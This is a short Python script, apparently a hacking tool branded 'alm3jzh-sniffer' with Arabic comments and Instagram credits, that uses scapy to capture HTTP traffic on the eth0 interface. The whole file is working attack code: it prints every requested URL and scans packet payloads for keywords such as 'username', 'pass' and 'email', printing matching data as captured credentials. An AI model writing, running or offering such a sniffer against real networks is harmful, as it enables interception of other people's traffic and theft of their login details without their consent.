# ألوان ANSI
RED = "\033[91m"
CYAN = "\033[96m"
GREEN = "\033[92m"
PURPLE = "\033[95m"
RESET = "\033[0m"

# طباعة الحقوق
print(CYAN + r"""
         __         _____   _       __                     _ ________         
  ____ _/ /___ ___ |__  /  (_)___  / /_        _________  (_) __/ __/__  _____
 / __ `/ / __ `__ \ /_ <  / /_  / / __ \______/ ___/ __ \/ / /_/ /_/ _ \/ ___/
/ /_/ / / / / / / /__/ / / / / /_/ / / /_____(__  ) / / / / __/ __/  __/ /    
\__,_/_/_/ /_/ /_/____/_/ / /___/_/ /_/     /____/_/ /_/_/_/ /_/  \___/_/     
                     /___/                                                    
""" + RED + "Instagram: @qhwp" + RESET + CYAN + " | Created By @alm3jzh" + RESET + "\n")

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        host = packet[http.HTTPRequest].Host.decode()
        path = packet[http.HTTPRequest].Path.decode()
        url = host + path
        print(GREEN + "[+] HTTP Request >> " + url + RESET)

        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode(errors="ignore")
            keywords = ["username", "login", "pass", "password", "user", "email", "emailaddress"]
            for keyword in keywords:
                if keyword in load:
                    print(PURPLE + "\n[###✓###] Possible username/password => " + load + "\n" + RESET)
                    break

sniff("eth0")


